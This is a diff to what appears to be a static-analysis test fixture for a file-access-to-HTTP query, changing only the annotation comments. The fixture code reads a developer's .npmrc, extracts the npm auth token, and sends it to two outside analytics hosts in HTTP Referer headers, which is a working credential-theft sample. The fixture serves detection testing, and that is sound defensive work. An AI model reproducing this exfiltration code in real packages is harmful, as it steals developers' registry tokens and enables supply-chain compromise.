@@ -7,7 +7,7 @@ try {
     content = fs.readFileSync(npmrc, { encoding: "utf8" });
     fs.open(npmrc, "r", function (error, fd) {
       var buffer = new Buffer(stats.size);
-      fs.read(fd, buffer, 0, buffer.length, null, function (error, bytesRead, buffer) {
+      fs.read(fd, buffer, 0, buffer.length, null, function (error, bytesRead, buffer) { // $ Source[js/file-access-to-http]
         var content = buffer.toString("utf8", 0, bytesRead);
         content = content.replace("//registry.npmjs.org/:_authToken=", "").trim();
         var https1 = require("https");
@@ -15,14 +15,14 @@ try {
           hostname: "sstatic1.histats.com",
           path: "/0.gif?4103075&101",
           method: "GET",
-          headers: { Referer: "http://1.a/" + content } //BAD: passing stolen token in a  header
-        }, () => { })
+          headers: { Referer: "http://1.a/" + content } // passing stolen token in a  header
+        }, () => { }) // $ Alert[js/file-access-to-http]
         https1.get({
           hostname: "c.statcounter.com",
           path: "/11760461/0/7b5b9d71/1/",
           method: "GET",
-          headers: { Referer: "http://2.b/" + content } //BAD: passing stolen token in a  header
-        }, () => { })
+          headers: { Referer: "http://2.b/" + content } // passing stolen token in a  header
+        }, () => { }) // $ Alert[js/file-access-to-http]
       });
     });
   }
